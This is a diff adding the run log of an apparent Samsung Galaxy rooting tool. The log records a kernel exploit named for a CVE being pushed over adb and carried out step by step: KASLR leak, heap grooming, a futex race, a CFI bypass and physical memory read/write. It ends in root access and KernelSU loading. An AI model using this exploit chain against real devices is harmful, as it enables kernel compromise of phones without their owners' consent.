@@ -1,0 +1,177 @@
+
+[1;36m==> Target: pa2q-S9360ZHSCCZG1[0m
+    fingerprint : samsung/pa2qzhx/pa2q:16/BP4A.251205.006/S9360ZHSCCZG1_OZSCCZG1:user/release-keys
+    PDA         : S9360ZHSCCZG1
+    payload     : /home/butlanys/Documents/samsung-root/Root-My-Galaxy-Payloads/build/pa2q-S9360ZHSCCZG1/cve-2026-43499-app.so
+    helper      : /home/butlanys/Documents/samsung-root/Root-My-Galaxy-Payloads/build/pa2q-S9360ZHSCCZG1/cve-2026-43499-root
+    ksud        : /home/butlanys/Documents/samsung-root/Root-My-Galaxy-Payloads/kernelsu/ksud-s25u-kdp
+
+[1;36m==> Checking device[0m
+    model    : SM-S9360
+    kernel   : 6.6.98-android15-8-pd6ff1cd-abogkiS9360ZHSCCZG1-4k
+    fingerpr : samsung/pa2qzhx/pa2q:16/BP4A.251205.006/S9360ZHSCCZG1_OZSCCZG1:user/release-keys
+
+[1;36m==> Pushing payload and helper[0m
+/home/butlanys/Documents/samsung-root/Root-My-Galaxy-Payloads/build/pa2q-S9360ZHSCCZG1/cve-2026-43499-app.so: 1 file pushed, 0 skipped. 141.6 MB/s (126624 bytes in 0.001s)
+/home/butlanys/Documents/samsung-root/Root-My-Galaxy-Payloads/build/pa2q-S9360ZHSCCZG1/cve-2026-43499-root: 1 file pushed, 0 skipped. 282.9 MB/s (26896 bytes in 0.000s)
+    pushed cve-2026-43499-app.so and cve-2026-43499-root
+/home/butlanys/Documents/samsung-root/Root-My-Galaxy-Payloads/kernelsu/ksud-s25u-kdp: 1 file pushed, 0 skipped. 112.8 MB/s (6407096 bytes in 0.054s)
+    pushed ksud-s25u-kdp
+
+[1;36m==> Running exploit (shell domain, attempts=8)[0m
+[33m[*] [0mwaiting for boot allocator quiet window seconds=95 uptime=25
+[32m[+] [0mpreload supervisor pid=8131 attempts=8 base_delay=20000 p0_timeout=45 timeout=120
+[32m[+] [0mexploit attempt=1/8 pid=22591 delay=25000 p0_offset=scan
+[32m[+] [0mstartup context pid=22591 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=22591 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=22591 label=pa2q-S9360ZHSCCZG1-app-physical-p0-oracle stack_writer=pselect reclaim=legacy fops=bank pipe=before-fops
+[32m[+] [0mp0 profile pid=22591 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802975e266 bootid_data=ffffff802a439490 init_task=ffffff802a30e4c0 root_tg=ffffff802a51cd80 sysctl_bootid=ffffff802a6426d8
+[33m[*] [0mslide source mode=p0
+[33m[*] [0mp0 pipe oracle prepared base=ffffff8812530000 pipes=240 gate_slots=1
+[33m[*] [0mmm leaked=ffffff893ef9d500 base=ffffff893ef98000 object_index=17
+[33m[*] [0mmm target-neighbor slab queued for late drain
+[33m[*] [0mmm late cpu-partial drain triggers=32
+[33m[*] [0msk_buff reclaim sends=4/4 mode=1
+[33m[*] [0mkernel page prepare mode=1 attempt=1/2 elapsed_ms=2686 base=ffffff893ef98000
+[32m[+] [0mslide child context stack_writer=pselect pid=28738 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[33m[*] [0mslide pi stage=owner-target-locked tid=28740
+[33m[*] [0mslide pi stage=owner-chain-lock-enter tid=28740
+[33m[*] [0mslide pi stage=cmp-enter waiter_tid=28739
+[33m[*] [0mslide pi stage=cmp-return ret=-1 errno=35 polls=1
+[33m[*] [0mslide pi stage=deadlock-accepted
+[33m[*] [0mslide wait_requeue_pi ret=-1 errno=110
+[33m[*] [0mslide pi stage=wait-timeout-accepted tid=28739
+[33m[*] [0mslide pi stage=waiter-unlock-enter tid=28739
+[33m[*] [0mslide pi stage=waiter-unlock-return tid=28739
+[33m[*] [0mslide pi stage=owner-chain-lock-return tid=28740
+[33m[*] [0mslide pi stage=writer-enter tid=28739
+[33m[*] [0mslide pselect returned nfds=320 pad=0 ret=6 errno=0 elapsed_usec=100126 ready=1 seen=1 entered=1 calls=1 sched_ok=1 last_sched_ret=0 last_sched_errno=0
+[33m[*] [0mslide pi stage=writer-return tid=28739 sched_ok=1 window=1
+[33m[*] [0mp0 physical write status=0 ok=1
+[33m[*] [0mp0 physical slot=0 write attempt=1/1 delay=25000 nfds=320 pad=0
+[33m[*] [0mp0 gate marker pipe=130 offset=0
+[33m[*] [0mp0 pipe gate hits=1 changed=0
+[33m[*] [0mp0 reference keeper pid=28742 pipe=130
+[32m[+] [0mslide child context stack_writer=pselect pid=28743 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[33m[*] [0mslide pi stage=owner-target-locked tid=28745
+[33m[*] [0mslide pi stage=owner-chain-lock-enter tid=28745
+[33m[*] [0mslide pi stage=cmp-enter waiter_tid=28744
+[33m[*] [0mslide pi stage=cmp-return ret=-1 errno=35 polls=1
+[33m[*] [0mslide pi stage=deadlock-accepted
+[33m[*] [0mslide wait_requeue_pi ret=-1 errno=110
+[33m[*] [0mslide pi stage=wait-timeout-accepted tid=28744
+[33m[*] [0mslide pi stage=waiter-unlock-enter tid=28744
+[33m[*] [0mslide pi stage=waiter-unlock-return tid=28744
+[33m[*] [0mslide pi stage=owner-chain-lock-return tid=28745
+[33m[*] [0mslide pi stage=writer-enter tid=28744
+[33m[*] [0mslide pselect returned nfds=320 pad=0 ret=4 errno=0 elapsed_usec=100127 ready=1 seen=1 entered=1 calls=1 sched_ok=1 last_sched_ret=0 last_sched_errno=0
+[33m[*] [0mslide pi stage=writer-return tid=28744 sched_ok=1 window=1
+[33m[*] [0mp0 physical write status=0 ok=1
+[33m[*] [0mp0 physical slot=1 write attempt=1/1 delay=25000 nfds=320 pad=0
+[33m[*] [0mp0 fingerprint sample w0=35000134b40000c8 w1=52a0020052802008 w2=b100055ff94142a9 w3=8b0901cef94539ae w4=f980001152800029 w5=eb0a013f9a880128 w6=d50323bfa8c47bfd w7=54fffe01f90539ae
+[33m[*] [0mp0 fingerprint pipe=130 best=8 second=0 slide=000e0000
+[33m[*] [0mp0 fingerprint changed=1 best=8 second=0 slide=000e0000
+[32m[+] [0mslide child context stack_writer=pselect pid=28747 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[33m[*] [0mslide pi stage=owner-target-locked tid=28749
+[33m[*] [0mslide pi stage=owner-chain-lock-enter tid=28749
+[33m[*] [0mslide pi stage=cmp-enter waiter_tid=28748
+[33m[*] [0mslide pi stage=cmp-return ret=-1 errno=35 polls=1
+[33m[*] [0mslide pi stage=deadlock-accepted
+[33m[*] [0mslide wait_requeue_pi ret=-1 errno=110
+[33m[*] [0mslide pi stage=wait-timeout-accepted tid=28748
+[33m[*] [0mslide pi stage=waiter-unlock-enter tid=28748
+[33m[*] [0mslide pi stage=owner-chain-lock-return tid=28749
+[33m[*] [0mslide pi stage=waiter-unlock-return tid=28748
+[33m[*] [0mslide pi stage=writer-enter tid=28748
+[33m[*] [0mslide pselect returned nfds=320 pad=0 ret=4 errno=0 elapsed_usec=100126 ready=1 seen=1 entered=1 calls=1 sched_ok=1 last_sched_ret=0 last_sched_errno=0
+[33m[*] [0mslide pi stage=writer-return tid=28748 sched_ok=1 window=1
+[33m[*] [0mp0 physical write status=0 ok=1
+[33m[*] [0mp0 physical slot=2 write attempt=1/1 delay=25000 nfds=320 pad=0
+[32m[+] [0mslide child context stack_writer=pselect pid=28751 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[33m[*] [0mslide pi stage=owner-target-locked tid=28753
+[33m[*] [0mslide pi stage=owner-chain-lock-enter tid=28753
+[33m[*] [0mslide pi stage=cmp-enter waiter_tid=28752
+[33m[*] [0mslide pi stage=cmp-return ret=-1 errno=35 polls=1
+[33m[*] [0mslide pi stage=deadlock-accepted
+[33m[*] [0mslide wait_requeue_pi ret=-1 errno=110
+[33m[*] [0mslide pi stage=wait-timeout-accepted tid=28752
+[33m[*] [0mslide pi stage=waiter-unlock-enter tid=28752
+[33m[*] [0mslide pi stage=waiter-unlock-return tid=28752
+[33m[*] [0mslide pi stage=owner-chain-lock-return tid=28753
+[33m[*] [0mslide pi stage=writer-enter tid=28752
+[33m[*] [0mslide pselect returned nfds=320 pad=0 ret=3 errno=0 elapsed_usec=100123 ready=1 seen=1 entered=1 calls=1 sched_ok=1 last_sched_ret=0 last_sched_errno=0
+[33m[*] [0mslide pi stage=writer-return tid=28752 sched_ok=1 window=1
+[33m[*] [0mp0 physical write status=0 ok=1
+[33m[*] [0mp0 physical slot=3 write attempt=1/1 delay=25000 nfds=320 pad=0
+[33m[*] [0mp0 physical restore triggers gate=1 probe=1 gate_page=fffffffe24fbe600 probe_page=fffffffe00a07c00
+[32m[+] [0mp0 physical elapsed_ms=5215
+[32m[+] [0mslide-kaslr-ok source=physical pid=22591 base=ffffffc0800e0000 slide=00000000000e0000 data_mode=physical-alias
+[33m[*] [0mfresh physrw pipe page=ffffff8946b70000
+[33m[*] [0mmm leaked=ffffff88205e1400 base=ffffff88205e0000 object_index=4
+[33m[*] [0mmm target-neighbor slab queued for late drain
+[33m[*] [0mmm late cpu-partial drain triggers=32
+[33m[*] [0msk_buff reclaim sends=4/4 mode=0
+[33m[*] [0mkernel page prepare mode=0 attempt=1/2 elapsed_ms=4731 base=ffffff88205e0000
+[33m[*] [0mdurable log checkpoint stage=fops-page-held
+[31m[-] [0mdurable log checkpoint skipped stage=fops-page-held mode=0140777
+[33m[*] [0mp0 reference keeper pid=8607 pipe=0
+[33m[*] [0mapp fops slide route parent=ffffff88205e1180 target=ffffff802a55d7f0 lock=ffffff88205e4380 configured_delay=70000 consume_delay=70000 fine_ticks=0
+[32m[+] [0mslide child context stack_writer=pselect pid=8608 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[33m[*] [0mslide pi stage=owner-target-locked tid=8610
+[33m[*] [0mslide pi stage=owner-chain-lock-enter tid=8610
+[33m[*] [0mslide pi stage=cmp-enter waiter_tid=8609
+[33m[*] [0mslide pi stage=cmp-return ret=-1 errno=35 polls=1
+[33m[*] [0mslide pi stage=deadlock-accepted
+[33m[*] [0mslide wait_requeue_pi ret=-1 errno=110
+[33m[*] [0mslide pi stage=wait-timeout-accepted tid=8609
+[33m[*] [0mslide pi stage=waiter-unlock-enter tid=8609
+[33m[*] [0mslide pi stage=waiter-unlock-return tid=8609
+[33m[*] [0mslide pi stage=owner-chain-lock-return tid=8610
+[33m[*] [0mslide pi stage=writer-enter tid=8609
+[33m[*] [0mslide pselect returned nfds=320 pad=0 ret=7 errno=0 elapsed_usec=100123 ready=1 seen=1 entered=1 calls=1 sched_ok=1 last_sched_ret=0 last_sched_errno=0
+[33m[*] [0mslide pi stage=writer-return tid=8609 sched_ok=1 window=1
+[33m[*] [0mp0 physical write status=0 ok=1
+[33m[*] [0mapp fops stage=trigger-return attempt=1 triggered=1
+[33m[*] [0mcfi fake fops span=ffffff88205e1180-ffffff88205e125f owner=0000000000000000 llseek=ffffff802a55d7f0 read=0000000000000000 write=0000000000000000
+[33m[*] [0mcfi scratch span=ffffff88205e2180-ffffff88205e21a2 old=zero size=35
+[33m[*] [0mcfi write ret=35 errno=0
+[33m[*] [0mcfi llseek before=ffffff802a55d7f0 want=ffffffc0804a9450 slot=ffffff88205e1188
+[33m[*] [0mcfi read ret=35 errno=0
+[33m[*] [0mp0 restore page=fffffffe24fbe600 read=8 needed=0 write=0 verify=8 before=0000000000000000 after=0000000000000000
+[33m[*] [0mp0 restore page=fffffffe00a07c00 read=8 needed=0 write=0 verify=8 before=0000000000000000 after=0000000000000000
+[33m[*] [0mcfi restoring misc_fops target=ffffff802a55d7f0 value=ffffffc0814eb440
+[33m[*] [0mcfi starting pipe physrw
+[33m[*] [0mpipe caches normal1k=ffffff8001cf4b00 normal2k=ffffff8001cf4c00 cgroup1k=ffffff8001cf4b00 cgroup2k=ffffff8001cf4c00 selected=ffffff8001cf4c00
+[33m[*] [0mpipe page idx=0 page=ffffff8946b70000 head=fffffffe251adc00 cache08=ffffff8001cf4c00 cache10=dead000000000122 cache18=0000000000000000 cache20=0000000000000000 type=ffffffff match=1
+[33m[*] [0mphys step pipe probe found=1 pipebuf=ffffff8946b70000 idx=184 scan=1/1/1
+[33m[*] [0mphys proof spans data=ffffff88205e7000-ffffff88205e7016 qword=ffffff88205e7100-ffffff88205e7107
+[33m[*] [0mphys step probed read done ok=1 idx=184
+[33m[*] [0mphys step probed write done ok=1
+[33m[*] [0mphys step read64 done ok=1 value=306365737562656e
+[33m[*] [0mphys proof64 restore=1 old=0000000000000000 now=0000000000000000
+[33m[*] [0mphys proof restore=1 size=23
+[33m[*] [0mroot configfs-pipe start uid=2000 fd=5
+[33m[*] [0mroot umh spans work=ffffff88205e6000-ffffff88205e606f data=ffffff88205e6200-ffffff88205e6367 selinux=ffffff802a63f5c0 old=1
+[33m[*] [0mroot umh queued wq=ffffff8001cfca00 pwq=ffffff8001963e00 pool=ffffff8057009000 work=ffffff88205e6000 entry=ffffff88205e6008 color=0 counters=0/0/1 writes=1/1/1/1/1/1/1
+[33m[*] [0mroot umh result wake=1 complete=1 retval=0 socket=1
+[33m[*] [0mroot umh scratch restore work=1/1 data=1/1
+[33m[*] [0mroot umh selinux left=0 intended root state old=1
+[33m[*] [0mroot p0 reference holder ready=1
+[33m[*] [0mapp fops slide attempt=1/1 triggered=1 verified=1 step=0 errno=0
+[32m[+] [0mpipe-physrw-summary pid=22591 done=1 root=1 kaslr=1 base=ffffffc0800e0000 slide=00000000000e0000
+[32m[+] [0mpipe physrw pid=22591 done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
+[32m[+] [0mstability keeper pid=8620 retaining reclaimed kernel pages
+[32m[+] [0mexploit completed attempt=1/8
+uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),1078(ext_data_rw),1079(ext_obb_rw),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid),3012(readtracefs) context=u:r:shell:s0
+    exploit completed (log: /tmp/reroot.nAFuKx.log)
+
+[1;36m==> Verifying temporary root[0m
+    uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
+
+[1;36m==> Loading KernelSU (late-load)[0m
+    staged /data/local/tmp/.ksud-stage
+    late-load via helper succeeded
+    KernelSU module loaded
+    uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
+
+[1;36m==> Done - temporary root + KernelSU (per-boot)[0m
